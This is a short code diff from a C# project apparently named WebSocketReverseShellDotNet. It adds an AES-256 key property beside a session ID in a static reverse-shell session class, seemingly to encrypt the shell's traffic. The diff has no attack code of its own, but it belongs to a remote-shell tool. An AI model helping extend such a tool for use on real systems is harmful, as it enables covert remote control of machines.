@@ -9,5 +9,6 @@ namespace WebSocketReverseShellDotNet.model
     internal static class ReverseShellSession
     {
         public static String? SessionId { get; set; }
+        public static String? AES256Key { get; set; }
     }
 }
